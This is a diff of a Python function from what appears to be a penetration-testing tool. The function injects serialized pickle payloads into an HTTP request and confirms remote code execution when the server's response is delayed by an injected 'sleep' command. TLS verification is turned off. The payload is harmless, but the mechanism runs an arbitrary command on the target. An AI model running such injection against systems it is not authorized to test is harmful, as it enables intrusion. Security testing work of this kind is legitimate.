@@ -284,31 +284,38 @@ def confirm_vuln():
     else:
         sleep_time = 5
 
-    print(sleep_time)
-    time.sleep(10)
+
+    # list of payloads(different pickle protocol)
+    payloads_list = generate_payload(f"sleep {sleep_time}")
+
+    for payload in payloads_list:
+        (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
+        req = Request(method=method, url=url, headers=headers, data=data)
+        prepared_req = req.prepare()
+
+        try:
+            if proxy_servers is not None:
+                response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
+            else:
+                response = requests.Session().send(prepared_req, verify=False)
+        except requests.exceptions.SSLError:
+            print_red("[+] SSL error. Use --http flag?")
+            exit(1)
+
+        if response.elapsed.total_seconds() > sleep_time:
+           # double check
+            if proxy_servers is not None:
+                response2 = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
+            else:
+                response2 = requests.Session().send(prepared_req, verify=False)
+            
+            if response2.elapsed.total_seconds() > sleep_time:
+                print_green("\n[+] Tested web application is vulnerable!!!") 
+                print_green(f"[+] Payload causing sleep {sleep_time}: {payload}")
+                print()
 
 
-    for nix_payload in utils.sleep_nix:
-
-        #TODO: napraviti len(utils.slee_win) threadova/procesa tako da cjela petlja traje koliko i najsporiji sleep a ne suma svih
-        # list of payloads(different pickle protocol)
-        payloads_list = generate_payload(nix_payload)
-
-        for payload in payloads_list:
-            (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
-            req = Request(method=method, url=url, headers=headers, data=data)
-            prepared_req = req.prepare()
-
-            try:
-                if proxy_servers is not None:
-                    response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
-                else:
-                    response = requests.Session().send(prepared_req, verify=False)
-            except requests.exceptions.SSLError:
-                print_red("[+] SSL error. Use --http flag?")
-                exit(1)
-
-            print("[+] Response time:", response.elapsed.total_seconds()) #microseconds?
+    #todo: test with some prepickled sleep/timeout payloads
 
 
 
